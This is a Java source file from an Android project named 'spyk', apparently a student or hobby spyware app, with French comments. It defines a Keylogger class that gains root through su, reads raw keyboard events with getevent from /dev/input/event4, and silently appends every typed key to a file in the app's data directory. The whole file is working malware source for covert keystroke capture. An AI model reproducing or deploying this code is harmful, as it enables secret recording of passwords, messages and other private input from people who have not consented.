package com.ware.spyk;

import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Map;
import java.util.Arrays;

public class Keylogger {

    private static final String TAG = "Keylogger";
    private static final String LOG_FILE = "/data/data/com.ware.spyk/files/keylog.txt";

    /*private static final Map<String, String> keyMap = new HashMap<>();
    static {
        keyMap.put("001e", "a");
        keyMap.put("0030", "b");
        keyMap.put("002e", "c");
        keyMap.put("0020", "d");
        keyMap.put("0012", "e");
        keyMap.put("0021", "f");
        keyMap.put("0022", "g");
        keyMap.put("0023", "h");
        keyMap.put("0017", "i");
        keyMap.put("0024", "j");
        keyMap.put("0025", "k");
        keyMap.put("0026", "l");
        keyMap.put("0032", "m");
        keyMap.put("0031", "n");
        keyMap.put("0018", "o");
        keyMap.put("0019", "p");
        keyMap.put("0010", "q");
        keyMap.put("0013", "r");
        keyMap.put("001f", "s");
        keyMap.put("0014", "t");
        keyMap.put("0016", "u");
        keyMap.put("002f", "v");
        keyMap.put("0011", "w");
        keyMap.put("002d", "x");
        keyMap.put("0015", "y");
        keyMap.put("002c", "z");
        keyMap.put("0002", "1");
        keyMap.put("0003", "2");
        keyMap.put("0004", "3");
        keyMap.put("0005", "4");
        keyMap.put("0006", "5");
        keyMap.put("0007", "6");
        keyMap.put("0008", "7");
        keyMap.put("0009", "8");
        keyMap.put("000a", "9");
        keyMap.put("000b", "0");
        keyMap.put("001c", "\n"); // ENTER
        keyMap.put("0039", " "); // SPACE
    }
    utile en réalité mais j'ai du m'adapter a mon émulateur*/


    public static void start() {
        new Thread(() -> {
            try {
                String[] cmd = {
                        "su", "-c",
                        "getevent -lt /dev/input/event4"
                };
                Process process = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                Log.d("keylogger", "new file");
                FileWriter fw = new FileWriter(new File(LOG_FILE), true);
                BufferedWriter writer = new BufferedWriter(fw);
                String[] ignoredKeys = {
                        "BTN_TOUCH", "KEY_LEFTALT", "KEY_RIGHTALT", "KEY_LEFTCTRL", "KEY_RIGHTCTRL",
                        "KEY_LEFTSHIFT", "KEY_RIGHTSHIFT", "KEY_CAPSLOCK", "KEY_MENU", "KEY_FN",
                        "KEY_POWER", "KEY_SLEEP", "KEY_BACKSPACE"
                };
                String line;
                while ((line = reader.readLine()) != null) {
                    Log.d(TAG, "Événement reçu : " + line);
                    boolean isIgnored = Arrays.stream(ignoredKeys).anyMatch(line::contains);

                    if (line.contains("EV_KEY") && line.contains("DOWN") && !isIgnored) {
                        String[] parts = line.trim().split("\\s+");
                        String key;
                        if (parts.length >= 5) {
                            String keyCode = parts[3]; // ex: KEY_E
                            if ("KEY_SPACE".equals(keyCode)) {
                                key = " ";
                            } else if ("KEY_APOSTROPHE".equals(keyCode)){
                                key = "'";
                            }
                            else if ("KEY_ENTER".equals(keyCode)) {
                                key = "\n";
                            } else if ("KEY_TAB".equals(keyCode)) {
                                key ="\t";
                            } else {
                                key = keyCode.replace("KEY_", "").toLowerCase();
                            }
                            try {
                                writer.write(key);
                                writer.flush();
                                Log.d("Keylogger", "→ Clé détectée : " + key);
                            } catch (Exception e) {
                                Log.e(TAG, "Erreur dans le keylogger", e);
                            }
                        }
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Erreur dans le keylogger", e);
            }
        }).start();
    }
}
